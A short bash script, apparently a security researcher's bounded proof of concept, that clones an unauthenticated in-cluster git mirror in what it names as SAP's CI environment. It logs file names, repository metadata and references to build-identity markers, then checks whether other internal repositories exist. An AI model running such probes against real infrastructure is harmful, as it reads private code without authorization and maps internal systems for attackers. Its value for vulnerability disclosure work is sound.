#!/usr/bin/env bash
# Bounded read of the unauthenticated in-cluster git mirror, from my OWN build pod.
# The clone stays INSIDE SAP's pod. Only file NAMES, counts and a few non-secret lines reach the log.
set -u
N=kp-mirror-read-nonce-2026-09-17d
M=http://git-mirror.pipeline-services.svc.cluster.local
echo "$N BEGIN"
if timeout 90 git clone --depth 1 -q "$M/git/cloudci/pipeline-lib.git" /tmp/plib 2>/tmp/kpc.err; then
  cd /tmp/plib
  echo "$N CLONED files=$(git ls-files | wc -l) head=$(git rev-parse --short HEAD) date=$(git log -1 --format=%cI)"
  echo "$N TOPLEVEL: $(ls -1 | tr '\n' ' ')"
  echo "$N ORIGIN-HINT: $(git config --get remote.origin.url)"
  echo "$N FIRST-README-LINE: $(head -n 3 README.md 2>/dev/null | tr '\n' ' ' | head -c 160)"
  echo "$N LICENSE-LINE: $(head -n 2 LICENSE* 2>/dev/null | tr '\n' ' ' | head -c 120)"
  echo "$N BUILD_IDENTITY refs: $(grep -rl 'BUILD_IDENTITY' . 2>/dev/null | head -5 | tr '\n' ' ')"
  echo "$N BACK_CHANNEL refs: $(grep -rl 'BACK_CHANNEL' . 2>/dev/null | head -5 | tr '\n' ' ')"
  cd /
else
  echo "$N CLONE-FAIL :: $(head -c 200 /tmp/kpc.err | tr -d '\n')"
fi
# bounded existence check for other repositories on the same mirror
for r in cloudci/cloudci-lib cloudci/piper cloudci/steward cloudci/jenkins-library cloudci/cicd-service SAP/jenkins-library piper/piper; do
  if timeout 15 git ls-remote --heads "$M/git/$r.git" >/dev/null 2>&1; then echo "$N EXISTS $r"; else echo "$N absent $r"; fi
done
echo "$N END"
